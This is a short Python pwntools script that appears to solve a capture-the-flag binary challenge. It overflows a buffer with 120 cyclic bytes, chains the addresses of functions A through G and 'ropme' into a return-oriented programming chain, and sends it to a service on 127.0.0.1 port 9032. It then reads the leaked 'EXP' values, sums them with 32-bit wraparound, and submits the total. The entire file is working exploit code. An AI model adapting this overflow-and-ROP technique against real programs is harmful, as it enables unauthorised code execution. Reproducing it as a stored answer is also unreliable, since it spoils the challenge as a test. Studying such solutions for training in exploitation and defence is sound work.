#!/usr/bin/env python

import pwn
from pwnlib import shellcraft
from pwnlib import asm
import argparse
import os
import ctypes

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
parser.add_argument("-d", "--debug", action="store_true", help="Debug challenge")
args = parser.parse_args()

elf = pwn.ELF(f'{args.filename}')
funcs = elf.functions

if args.debug:
  p = pwn.gdb.debug(args=[f'{args.filename}'], gdbscript='''
#b *0x8041696
c
''')
else:
  p = pwn.remote('127.0.0.1', 9032)

p.sendline(b'0')

# A, ..., G, exp question.
rop_array = [funcs[funcname].address for funcname in ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'ropme']]
ropchain = b''.join([pwn.p32(nextrop) for nextrop in rop_array])

ropchain = pwn.cyclic(120) + ropchain

print(ropchain)
p.sendline(ropchain)

exp = 0
found = 0
while (found < 7):
    line = p.recvline()
    print(line)
    if b'EXP +' in line:
        exp += int(line.split(b'+')[1].split(b')')[0])
        found += 1
exp = ctypes.c_int(exp).value
print(f"EXP: {exp}")
p.sendline(b'0')
p.sendline(f'{exp}')
print(p.recvall())
